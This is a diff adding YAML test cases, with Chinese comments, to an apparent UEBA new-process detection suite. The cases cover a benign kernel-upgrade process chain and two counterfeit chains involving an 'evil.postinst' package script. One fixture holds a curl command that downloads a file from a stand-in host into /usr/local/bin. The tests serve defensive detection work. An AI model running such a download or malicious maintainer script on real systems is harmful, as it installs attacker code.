@@ -472,3 +472,95 @@ cases:
           path: /opt/scutum-runner-backend/bin/Runner.Listener
         cmd_line: "/opt/scutum-runner-backend/bin/Runner.Listener run"
     expect: detected
+
+  # 8. apt 驱动的 dpkg 升级内核：维护脚本、run-parts、grub-mkconfig 一路冒出首次出现的新进程
+  - name: 良性链：unattended-upgrade 升级内核时 grub-mkconfig 调 /etc/grub.d/10_linux 放行
+    technique: UEBA-NEW-PROCESS
+    new_process: true
+    source: prod apt-dpkg-maintainer-scripts
+    class: 1007
+    os: linux
+    event:
+      activity_id: 1
+      process:
+        name: 10_linux
+        file:
+          path: /etc/grub.d/10_linux
+        cmd_line: "/etc/grub.d/10_linux"
+        parent_process:
+          name: grub-mkconfig
+          file:
+            path: /usr/sbin/grub-mkconfig
+          cmd_line: "grub-mkconfig -o /boot/grub/grub.cfg"
+    ancestors:
+      - name: update-grub
+        file:
+          path: /usr/sbin/update-grub
+        cmd_line: "update-grub"
+      - name: run-parts
+        file:
+          path: /usr/bin/run-parts
+        cmd_line: "run-parts --report --exit-on-error --arg=6.1.0-55-cloud-amd64 /etc/kernel/postinst.d"
+      - name: linux-image-6.1.0-55-cloud-amd64.postinst
+        file:
+          path: /var/lib/dpkg/info/linux-image-6.1.0-55-cloud-amd64.postinst
+        cmd_line: "/var/lib/dpkg/info/linux-image-6.1.0-55-cloud-amd64.postinst configure"
+      - name: dpkg
+        file:
+          path: /usr/bin/dpkg
+        cmd_line: "/usr/bin/dpkg --status-fd 11 --configure --pending"
+      - name: unattended-upgrade
+        file:
+          path: /usr/bin/unattended-upgrade
+        cmd_line: "/usr/bin/python3 /usr/bin/unattended-upgrade"
+    expect: undetected
+
+  - name: 仿冒链：手工 dpkg -i（不带 --status-fd）装的包维护脚本仍报首次出现
+    technique: UEBA-NEW-PROCESS
+    new_process: true
+    source: counterfactual apt-dpkg-maintainer-scripts
+    class: 1007
+    os: linux
+    event:
+      activity_id: 1
+      process:
+        name: evil.postinst
+        file:
+          path: /var/lib/dpkg/info/evil.postinst
+        cmd_line: "/var/lib/dpkg/info/evil.postinst configure"
+        parent_process:
+          name: dpkg
+          file:
+            path: /usr/bin/dpkg
+          cmd_line: "dpkg -i /root/evil.deb"
+    ancestors:
+      - name: bash
+        file:
+          path: /bin/bash
+        cmd_line: "-bash"
+    expect: detected
+
+  - name: 仿冒链：apt 升级期间维护脚本里的下载命令仍报首次出现
+    technique: UEBA-NEW-PROCESS
+    new_process: true
+    source: counterfactual apt-dpkg-maintainer-scripts
+    class: 1007
+    os: linux
+    event:
+      activity_id: 1
+      process:
+        name: curl
+        file:
+          path: /usr/bin/curl
+        cmd_line: "curl -fsSL http://203.0.113.9/x -o /usr/local/bin/x"
+        parent_process:
+          name: evil.postinst
+          file:
+            path: /var/lib/dpkg/info/evil.postinst
+          cmd_line: "/var/lib/dpkg/info/evil.postinst configure"
+    ancestors:
+      - name: dpkg
+        file:
+          path: /usr/bin/dpkg
+        cmd_line: "/usr/bin/dpkg --status-fd 11 --configure --pending"
+    expect: detected
